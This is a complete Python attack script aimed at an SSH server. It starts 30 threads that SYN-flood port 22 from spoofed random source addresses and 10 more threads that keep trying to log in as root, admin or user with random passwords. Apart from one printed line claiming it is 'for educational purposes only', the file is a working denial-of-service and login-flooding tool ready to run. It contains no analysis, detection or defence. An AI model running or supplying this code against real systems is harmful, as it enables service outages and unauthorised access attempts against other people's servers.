import time
import random
import threading
from scapy.all import *
from paramiko import SSHClient, AutoAddPolicy, SSHException

# Configuration
TARGET_IP = "192.168.1.100"  # Target IP
THREADS_SYN = 30              # Streams for SYN flood
THREADS_AUTH = 10             # Streams for authentication attacks
SYN_DELAY = 0.001            # Delay between SYN packets
AUTH_DELAY = 0.5             # Delay between authentication attempts
TIMEOUT = 5                  # Connection timeout

def syn_flood():
    """SYN flood with random source IPs and ports"""
    while True:
        try:
            sendp(
                Ether()/IP(src=RandIP(), dst=TARGET_IP)/
                TCP(sport=RandShort(), dport=22, flags="S"),
                verbose=0
            )
            time.sleep(SYN_DELAY)
        except Exception as e:
            print(f"SYN error: {str(e)}")
            time.sleep(1)

def ssh_auth():
    """Flooding SSH Server with Fake Credentials"""
    while True:
        try:
            with SSHClient() as client:
                client.set_missing_host_key_policy(AutoAddPolicy())
                client.connect(
                    hostname=TARGET_IP,
                    port=22,
                    username=random.choice(['root', 'admin', 'user']),
                    password=random._urandom(12).hex(),
                    timeout=TIMEOUT,
                    banner_timeout=TIMEOUT+2,
                    auth_timeout=TIMEOUT,
                    look_for_keys=False,
                    allow_agent=False
                )
        except (SSHException, socket.error, EOFError) as e:
            pass
        except Exception as e:
            print(f"Auth error: {str(e)}")
        finally:
            time.sleep(AUTH_DELAY)

if __name__ == "__main__":
    print("### ATTENTION! For educational purposes only ###")
    print(f"Target: {TARGET_IP}:22")

    # Запуск SYN-флуда
    for _ in range(THREADS_SYN):
        threading.Thread(target=syn_flood, daemon=True).start()

    # Запуск атак на аутентификацию
    for _ in range(THREADS_AUTH):
        threading.Thread(target=ssh_auth, daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped")